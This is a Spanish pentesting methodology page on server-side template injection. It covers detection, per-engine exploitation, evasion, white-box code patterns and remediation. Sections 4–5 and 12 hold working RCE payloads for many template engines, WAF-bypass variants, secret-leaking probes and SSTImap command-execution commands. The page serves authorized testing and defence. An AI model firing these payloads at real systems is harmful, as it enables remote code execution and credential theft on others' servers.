# Inyección de plantillas en el servidor (Server-Side Template Injection, SSTI)

| Clasificación | |
|---|---|
| CWE | CWE-1336 — Improper Neutralization of Special Elements Used in a Template Engine (también CWE-94 Code Injection) |
| OWASP Top 10:2025 | A05 — Injection |
| OWASP API Top 10:2023 | Sin categoría propia (aparece en APIs de notificaciones, correo y generación de documentos) |
| WSTG | WSTG-INPV-18 (Testing for Server-side Template Injection) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección y huella del motor · 4. Explotación por motor (Python, PHP, Java, Node, Ruby, .NET, Go) · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

Un **motor de plantillas** (Jinja2, Twig, Freemarker, Thymeleaf, ERB, Handlebars…) combina un texto con marcadores (`{{ nombre }}`) y unos datos para generar HTML, correos o documentos. La SSTI ocurre cuando la aplicación mete la entrada del usuario **dentro del texto de la plantilla** antes de compilarla (`render_template_string("Hola " + nombre)`), en lugar de pasarla como **dato** (`render_template_string("Hola {{ n }}", n=nombre)`). El motor interpreta entonces las expresiones del atacante y, a través del modelo de objetos del lenguaje anfitrión, casi siempre se llega a ejecución de código (RCE).

Casos típicos: plantillas de correo o notificaciones editables por el cliente, “personaliza tu mensaje”, CMS y constructores de páginas, generadores de PDF/facturas, páginas de error que pintan la URL, motores de reglas que usan plantillas para formatear, y vistas cuyo **nombre** se construye con datos del usuario (Thymeleaf/Spring).

Distinto de la **CSTI** (inyección de plantillas en el cliente: AngularJS, Vue) que produce XSS; ver `vulns/xss.md`.

## 2. Dónde buscar (señales del reconocimiento)

- Campos cuyo valor reaparece formateado: nombre en el saludo de un correo, asunto de notificaciones, firma, títulos de informes, plantillas de webhooks, previsualizaciones (“vista previa del correo”).
- Funcionalidades de “plantilla personalizada”, “variables disponibles: {{user.name}}”, editores de temas, *marketing automation*.
- Parámetros que eligen vista o idioma (`lang=`, `view=`, `template=`, `theme=`) en Spring/Thymeleaf.
- Mensajes de error con trazas: `jinja2.exceptions`, `Twig\Error`, `freemarker.core`, `org.thymeleaf`, `Liquid error`, `ActionView::Template::Error`, `com.mitchellbosecke.pebble` / `io.pebbletemplates`.
- Tecnología: Flask/Django (Jinja2), Symfony/Craft/Grav (Twig), Spring (Thymeleaf, Freemarker), Liferay/Confluence (Velocity/Freemarker), Express (EJS, Pug, Handlebars, Nunjucks), Rails (ERB, Liquid), Go (`text/template`).

## 3. Detección segura (primeras sondas, no destructivas)

Usa números poco comunes para no confundir el resultado con contenido de la página: `1337*7 = 9359`.

```text
${{<%[%'"}}%\.            políglota: provoca error en casi cualquier motor
{{1337*7}}                Jinja2, Twig, Nunjucks, Pebble, Handlebars (error), Go (error)
${1337*7}                 Freemarker, Velocity (no evalúa), Thymeleaf/SpEL, Mako, JSP EL
#{1337*7}                 Thymeleaf (mensajes), Ruby interpolación, Pug, SpEL
<%= 1337*7 %>             ERB, EJS
${{1337*7}}               Jinja2 dentro de contextos con $
@(1337*7)                 Razor
{1337*7}                  Smarty
*{1337*7}                 Thymeleaf (selección)
[[${1337*7}]]             Thymeleaf inline
{{=1337*7}}               doT.js
```

Árbol de decisión:

```text
{{1337*7}} → 9359 ?
   sí → {{7*'7'}} → 7777777 → Jinja2 / Nunjucks       ({{config}} o {{self}} → Jinja2/Flask)
                   → 49      → Twig                    ({{_self}} devuelve objeto)
                   → error   → Pebble/Handlebars/otros
   no → ${1337*7} → 9359 ?
          sí → ${"a".toUpperCase()} → A → Freemarker / Thymeleaf-SpEL / JSP EL
               <#assign x=1>${x}     → 1 → Freemarker
               ${T(java.lang.Math).abs(-9359)} → 9359 → SpEL (Thymeleaf)
               ${self.module.__name__} → Mako
          no → <%= 1337*7 %> → 9359 → ERB (Ruby) o EJS (Node)  (error con "erb"/"ejs" desambigua)
               #set($x=1337*7)$x → 9359 → Velocity
               @(1337*7) → 9359 → Razor
               {{printf "%d" 9359}} → 9359 → Go text/template
               {$smarty.version} → versión → Smarty
```

Sondas de solo información (útiles como prueba inocua):

```text
{{config.__class__.__name__}}   {{self}}          Jinja2
{{_self.getTemplateName()}}     {{dump(app)}}     Twig (dump en debug)
${.version}                      ${.now}           Freemarker
{$smarty.version}                                  Smarty
{{.}}                                              Go: vuelca el objeto de datos
```

Detección ciega (no se ve la salida): error frente a no error (`{{1337*7}}` vs `{{1337*'x}}`), tiempo con RCE controlado (`sleep 3`) o OAST (§4).

## 4. Explotación por contexto o tecnología

Comando de prueba: `id` o un OAST. ⚠️ Cualquier payload que escriba ficheros o abra shell inversa **requiere confirmación explícita del cliente**.

### 4.1 Jinja2 (Python: Flask, Ansible, Airflow, Superset…)

```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}   {# Flask #}
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__('os').popen('id').read() }}
{# Buscar una clase útil sin depender del índice (cambia entre versiones de Python) #}
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c()._module.__builtins__['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}
```

Información sin ejecutar comandos: `{{ config }}`, `{{ config['SECRET_KEY'] }}` (permite falsificar sesiones Flask, ver `vulns/session.md`), `{{ request.environ }}`.

**Sandbox de Jinja2** (`SandboxedEnvironment`) bloquea atributos con `_`; las fugas pasan por objetos expuestos con métodos peligrosos o por `str.format` (CVE-2016-10745, corregido; y la familia de fallos `format_map`, CVE-2019-10906). Revisa qué objetos se pasan al contexto.

### 4.2 Mako, Tornado, Django

```mako
${ self.module.cache.util.os.popen('id').read() }
<% import os %>${ os.popen('id').read() }
```

```text
Tornado:  {% import os %}{{ os.popen('id').read() }}
Django:   sin RCE directo; filtra datos con {{ settings.SECRET_KEY }} si 'settings' está en contexto,
          {% debug %} vuelca el contexto
```

**Inyección de formato de Python** (`str.format` con plantilla del usuario; no es SSTI pero se prueba igual):

```text
{0.__class__}     {user.__init__.__globals__[CONFIG][SECRET_KEY]}     {app.config}
```

### 4.3 Twig (PHP: Symfony, Craft CMS, Drupal 8+)

```twig
{{ ['id']|filter('system') }}
{{ ['id']|map('passthru') }}
{{ ['id',0]|sort('system') }}
{{ [0,'id']|reduce('system') }}
{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}   {# Twig 1.x #}
{{ ['cat /etc/hostname']|filter('system') }}
```

Concatenación para evadir listas negras: `{{ ['id']|filter('sys'~'tem') }}`.

### 4.4 Smarty, Blade, Latte (PHP)

```smarty
{$smarty.version}
{system('id')}                          {* si las funciones PHP están permitidas *}
{php}echo shell_exec('id');{/php}       {* Smarty < 3.1 o SmartyBC *}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}   ⚠️ escribe ficheros
```

Blade: si el usuario controla la plantilla compilada (`Blade::render($input)`), `@php system('id') @endphp` o `{{ system('id') }}`.

### 4.5 Freemarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>${ oc("java.lang.ProcessBuilder",["id"]).start() }
${ "freemarker.template.utility.Execute"?new()("id") }
<#-- Con ?api habilitado (api_builtin_enabled=true) -->
${ object?api.class.protectionDomain.codeSource.location }
```

Con `TemplateClassResolver.SAFER_RESOLVER` o `ALLOWS_NOTHING_RESOLVER`, `?new` no instancia `Execute` ni `ObjectConstructor`; entonces la vía es abusar de objetos del modelo (beans de la aplicación) o de `?api`.

### 4.6 Velocity (Java: Confluence, Liferay, Solr)

```velocity
#set($x=1337*7)$x
#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())#set($p=$rt.exec("id"))$p.waitFor()
#set($s="")#set($rt=$s.getClass().forName("java.lang.Runtime").getRuntime())#set($p=$rt.exec("id"))
```

Para leer la salida se usa `java.util.Scanner` sobre `$p.getInputStream()` (ver PayloadsAllTheThings); para la prueba basta OAST: `$rt.exec("nslookup c0rvus.OAST")`.

### 4.7 Thymeleaf / Spring (SpEL)

```text
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
*{T(java.lang.Runtime).getRuntime().exec('nslookup c0rvus.OAST')}
```

**Manipulación del nombre de vista** (*view name manipulation*): controladores que devuelven `"user/" + lang` o rutas sin `@ResponseBody` en las que Spring usa la URL como nombre de vista. El preprocesado `__...__` evalúa la expresión:

```http
GET /doc/__${T(java.lang.Runtime).getRuntime().exec('nslookup c0rvus.OAST')}__::.x HTTP/1.1
GET /?lang=__${T(java.lang.Math).abs(-9359)}__::.x HTTP/1.1
```

Thymeleaf 3.0.12+ y 3.1 añaden restricciones (bloqueo de `T()` en ciertos contextos, de nombres de vista con expresiones y de acceso a clases peligrosas); prueba igualmente porque hay bypass documentados en versiones intermedias. Evasión de palabras clave: `T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))` → `id`; acceso a beans: `${@environment.getProperty('spring.datasource.password')}`.

### 4.8 Pebble, JinJava, Groovy templates (Java)

```pebble
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 0, bytes.length) }}
```

El índice `methods[6]` depende de la JVM; enumera antes con `{{ (1).TYPE.forName('java.lang.Runtime').methods }}`. Versiones recientes de Pebble bloquean `getClass`/`forName`.

```text
JinJava (HubSpot):  {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec("id")')}}   (versiones antiguas)
Groovy (SimpleTemplateEngine): ${"id".execute().text}
```

### 4.9 Node.js: EJS, Pug, Nunjucks, Handlebars, Lodash, doT

```ejs
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

```pug
#{global.process.mainModule.require('child_process').execSync('id').toString()}
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
```

```nunjucks
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")() }}
```

```handlebars
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.mainModule.require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

Handlebars ≥ 4.6 bloquea por defecto el acceso a propiedades del prototipo (`allowProtoPropertiesByDefault: false`), lo que neutraliza esta cadena salvo configuración insegura.

```text
Lodash _.template:  <%= global.process.mainModule.require('child_process').execSync('id') %>
doT:                {{= global.process.mainModule.require('child_process').execSync('id') }}
```

**SSTI por contaminación de prototipos**: en EJS, contaminar `outputFunctionName`, `escapeFunction` o `client`/`localsName` inyecta código en la plantilla compilada aunque la plantilla sea fija (ver `vulns/prototype-pollution.md`):

```json
{"__proto__":{"client":true,"escapeFunction":"1;return process.mainModule.require('child_process').execSync('id')"}}
```

### 4.10 Ruby: ERB, Slim, Haml, Liquid

```erb
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
<%= File.read('/etc/hostname') %>
<%= Rails.application.secrets.secret_key_base %>   <%# demuestra impacto: forja de cookies %>
```

```slim
= `id`
```

Liquid (Shopify, Jekyll) es seguro por diseño (sin acceso a objetos arbitrarios): solo filtrado de datos expuestos (`{{ shop | json }}`), no RCE.

### 4.11 .NET (Razor, Scriban, DotLiquid, Fluid)

```text
Razor (RazorEngine/RazorLight con plantilla del usuario):
@(1337*7)
@System.Diagnostics.Process.Start("cmd.exe","/c nslookup c0rvus.OAST")
Scriban:  {{ 1337*7 }}  — sandbox razonable; buscar objetos .NET expuestos con import
```

### 4.12 Go (`text/template`, `html/template`)

No hay aritmética ni acceso a reflexión arbitraria; el impacto depende de los **métodos exportados** del objeto pasado a `Execute`.

```gotemplate
{{ . }}                          vuelca la estructura de datos (fuga de campos)
{{ printf "%v" . }}
{{ .Secret }}                    campos exportados
{{ .MetodoPeligroso "id" }}      si el objeto tiene un método que ejecuta o lee ficheros
{{ define "x" }}…{{ end }}{{ template "x" }}
```

Con `text/template` además se obtiene XSS al no escapar HTML.

## 5. Evasión de filtros y WAF

Jinja2 (cuando se filtran `.`, `_`, `[]`, comillas o palabras clave):

```jinja
{{ request|attr('application') }}                                  {# sin punto #}
{{ ''['\x5f\x5fclass\x5f\x5f'] }}                                  {# hex de "_" #}
{{ request|attr('\x5f\x5fclass\x5f\x5f') }}
{{ ''|attr('__cla'~'ss__') }}   {{ ''|attr(['__cla','ss__']|join) }}
{# Pasar las cadenas por otro parámetro: ?a=__class__&b=__mro__&c=__subclasses__ #}
{{ ()|attr(request.args.a)|attr(request.args.b)|last|attr(request.args.c)() }}
{# Sin {{ }}: usar bloques #}
{% if config.__class__ %}c0rvus{% endif %}
{% print(1337*7) %}
{# Sin comillas: request.args.x, request.cookies.x, request.headers.x #}
```

Twig: `~` para concatenar, `|join`, `|reverse` (`{{ ['metsys']|map('reverse') }}`), funciones alternativas `passthru`, `exec`, `shell_exec`, `popen`.

Java/SpEL: `T(java.lang.Character).toString(…)`, `new java.lang.String(new byte[]{105,100})`, reflexión por cadenas troceadas (`"java.l"+"ang.Run"+"time"`).

Transporte: doble codificación URL solo si hay doble decodificación, cambio de `Content-Type`, parámetros partidos (HPP), saltos de línea dentro de los delimitadores (`{{\n1337*7\n}}`), espacios y guiones de control (`{%- -%}`). Ver `vulns/waf-bypass.md`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

1. **Confirmar motor y contexto** con aritmética y una sonda de información.
2. **Fuga de configuración** como prueba de impacto sin ejecución: `SECRET_KEY`, cadena de conexión, variables de entorno (mostrar solo nombre y primeros caracteres, redactados).
3. **RCE mínima**: `id`, `hostname` u OAST con identidad.
4. **Pivotes**: SSTI → SSRF desde el lenguaje (`urllib`, `java.net.URL`) hacia metadatos de nube (ver `vulns/ssrf.md`; pedir credenciales IAM ⚠️ requiere confirmación explícita del cliente); SSTI → lectura de código fuente para encontrar más fallos; `SECRET_KEY` → forja de sesión de administrador (`vulns/session.md`).
5. **Plantillas almacenadas**: si la plantilla editada por un usuario se renderiza para otros (correos masivos), el impacto incluye a terceros: documentarlo sin disparar envíos reales.

## 7. Caja blanca: fuentes, sumideros y patrones de código

**Python (Flask/Jinja2, Mako, Django)**
```python
# Vulnerable
render_template_string("Hola " + request.args["name"])
Environment().from_string(user_tpl).render()
Template(user_tpl).render()            # jinja2 / mako
"{user.name}".format(user=u) con formato controlado por el usuario
# Seguro
render_template_string("Hola {{ name }}", name=request.args["name"])
SandboxedEnvironment(autoescape=True).from_string(tpl_de_confianza)
```

**PHP (Twig, Smarty, Blade)**
```php
// Vulnerable
$twig->createTemplate("Hola " . $_GET['name'])->render();
$smarty->fetch('string:' . $userTpl);  Blade::render($userTpl);
// Seguro
$twig->render('hola.twig', ['name' => $_GET['name']]);
// Twig con plantillas de usuario: SandboxExtension + SecurityPolicy con lista blanca de tags/filtros/métodos
```

**Java (Thymeleaf, Freemarker, Velocity, Pebble)**
```java
// Vulnerable
@GetMapping("/doc/{page}") String doc(@PathVariable String page) { return "docs/" + page; }   // view name
new Template("t", new StringReader(userTpl), cfg);           // Freemarker con plantilla del usuario
Velocity.evaluate(ctx, w, "t", userTpl);
// Seguro
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER); cfg.setAPIBuiltinEnabled(false);
@GetMapping("/doc/{page}") String doc(@PathVariable String page, Model m) {
    if (!ALLOWED.contains(page)) throw new ResponseStatusException(HttpStatus.NOT_FOUND);
    return "docs/" + page; }
// o anotar con @ResponseBody / usar redirect: para que la URL no sea nombre de vista
```

**Node (EJS, Pug, Handlebars, Nunjucks)**
```js
// Vulnerable
ejs.render(req.body.template, data);   pug.render(userTpl);   Handlebars.compile(userTpl)(data);
nunjucks.renderString(userTpl, ctx);   _.template(userTpl)(data);
res.render('page', req.query);          // pasa settings/opciones controladas (EJS < 3.1.7)
// Seguro
res.render('page', { name: req.query.name });     // solo datos, plantilla fija
```

**.NET**
```csharp
// Vulnerable
Engine.Razor.RunCompile(userTemplate, "k", null, model);      // RazorEngine
// Seguro: plantillas fijas; para contenido de usuario, motores sandbox (Scriban/Fluid) con lista blanca de miembros
```

**Go**
```go
// Vulnerable
template.New("x").Parse("Hola " + r.URL.Query().Get("n"))
// Seguro
t := template.Must(template.New("x").Parse("Hola {{.N}}")); t.Execute(w, struct{N string}{n})
```

**Ruby**
```ruby
# Vulnerable
ERB.new("Hola #{params[:name]}").result(binding)
render inline: params[:tpl]
# Seguro
ERB.new("Hola <%= ERB::Util.h(name) %>").result_with_hash(name: params[:name])
Liquid::Template.parse(user_tpl).render(datos_permitidos)   # para plantillas de usuario
```

**Búsqueda (ripgrep / semgrep)**

```bash
rg -n --pcre2 'render_template_string\(|from_string\(|Template\(\s*(request|f["\x27]|.*\+)' --type py
rg -n --pcre2 'createTemplate\(|->fetch\(\s*["\x27]string:|Blade::render\(' --type php
rg -n --pcre2 'Velocity\.evaluate|new Template\(|StringTemplateLoader|setAPIBuiltinEnabled\(true\)' --type java
rg -n --pcre2 'return\s+"[^"]*"\s*\+\s*\w+;' --type java                     # nombres de vista concatenados
rg -n --pcre2 '(ejs\.render|pug\.render|pug\.compile|Handlebars\.compile|renderString|_\.template)\(\s*req\.' --type js
rg -n --pcre2 'res\.render\([^,]+,\s*req\.(query|body)\)' --type js
rg -n --pcre2 'render\s+inline:|ERB\.new\([^)]*#\{' --type ruby
rg -n --pcre2 'template\.New\([^)]*\)\.Parse\([^)]*\+' --type go
semgrep --config p/owasp-top-ten --config r/python.flask.security.audit.render-template-string.render-template-string .
```

## 8. Falsos positivos frecuentes

- `49`/`9359` en la respuesta porque el cálculo lo hace JavaScript en el navegador (CSTI) o la propia lógica de negocio (calculadora): mira la **respuesta HTTP cruda**, no el DOM.
- Motores sin lógica (Mustache, Liquid) que evalúan `{{x}}` como variable vacía: hay plantilla, pero no SSTI explotable; puede haber fuga de variables.
- Error del políglota provocado por un WAF o por el parser JSON, no por el motor.
- `{{7*7}}` devuelto literal en un correo porque se renderiza en otro servicio más tarde (revisar el correo recibido, puede ser SSTI ciega en otro componente).
- Markdown/Handlebars en el frontend que interpreta `{{ }}` sin evaluar aritmética.

## 9. Evidencia mínima para validarlo

- Petición con `{{1337*7}}` (o equivalente del motor) y respuesta con `9359`; segunda petición que identifica el motor.
- Si se demuestra RCE: salida de `id`/`hostname` u OAST con marca única, una sola vez.
- Fragmento del error o de la sonda de información que identifica motor y versión.
- Si la plantilla es almacenada: dónde se guarda, quién la renderiza y para quién.

## 10. Severidad orientativa

| Impacto | CVSS 3.1 | CVSS 4.0 (calcular con FIRST) |
|---|---|---|
| RCE sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (≈9.3) |
| RCE desde usuario autenticado (editor de plantillas) | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (8.8) | `…/PR:L/…` (≈8.7) |
| RCE solo desde rol administrador del CMS | `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (7.2) | `…/PR:H/…` |
| Motor con sandbox: solo fuga de configuración/secretos | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) | `…/VC:H/VI:N/VA:N/…` |
| Solo XSS por `text/template` o CSTI | ver `vulns/xss.md` | |

## 11. Remediación

1. Plantillas **fijas** en el servidor; la entrada del usuario solo como variables del contexto.
2. Si el negocio exige plantillas de usuario: motor sin lógica (Mustache, Liquid) o sandbox real (Twig `SandboxExtension`, Jinja2 `SandboxedEnvironment`, Freemarker `ALLOWS_NOTHING_RESOLVER` + `api_builtin_enabled=false`), contexto mínimo sin objetos con métodos peligrosos y renderizado en un proceso aislado.
3. Spring: no construir nombres de vista con datos del usuario; usar lista blanca, `@ResponseBody` o `redirect:`; mantener Thymeleaf actualizado.
4. Node: no pasar `req.query`/`req.body` enteros a `res.render`; actualizar EJS/Handlebars/Pug.
5. Mínimo privilegio del proceso y salida a Internet restringida (corta OAST y SSRF).

```python
from jinja2.sandbox import ImmutableSandboxedEnvironment
env = ImmutableSandboxedEnvironment(autoescape=True)
tpl = env.from_string(plantilla_guardada_por_el_cliente)   # sandbox, no evita fugas del contexto
html = tpl.render(nombre=usuario.nombre, pedido=pedido.id)  # solo tipos simples, nunca objetos ORM/app
```

## 12. Herramientas

- **SSTImap** (sucesor mantenido de tplmap), tras la confirmación manual:
  ```bash
  python3 sstimap.py -u "https://objetivo/page?name=x" -e Jinja2 --os-cmd "id"
  ```
- **TInjA** (Hackmanit), detección eficiente por políglotas: `tinja url -u "https://objetivo/page?name=x"`.
- **tplmap** (sin mantenimiento; útil en motores antiguos).
- **Burp Suite**: Intruder con la lista `Intruders/ssti.fuzz` de PayloadsAllTheThings, Collaborator para casos ciegos.
- **Template Injection Table** (Hackmanit) para huellas por motor.
- **semgrep**, **CodeQL** (`py/template-injection`, `java/server-side-template-injection`, `js/template-object-injection`).

## 13. Referencias

- PortSwigger Research — Server-Side Template Injection (James Kettle): https://portswigger.net/research/server-side-template-injection
- PortSwigger Web Security Academy — SSTI: https://portswigger.net/web-security/server-side-template-injection
- OWASP WSTG-INPV-18: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Tests/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
- PayloadsAllTheThings — SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- HackTricks — SSTI: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
- Hackmanit — Template Injection Table y TInjA: https://github.com/Hackmanit/TInjA
- SSTImap: https://github.com/vladko312/SSTImap
- Jinja2 Sandbox: https://jinja.palletsprojects.com/en/stable/sandbox/ · Freemarker FAQ de seguridad: https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security
- CWE-1336: https://cwe.mitre.org/data/definitions/1336.html
- Relacionados: `vulns/cmdi-rce.md`, `vulns/otras-inyecciones.md` (EL/SpEL/OGNL), `vulns/prototype-pollution.md`, `vulns/xss.md`, `vulns/ssrf.md`, `vulns/session.md`.
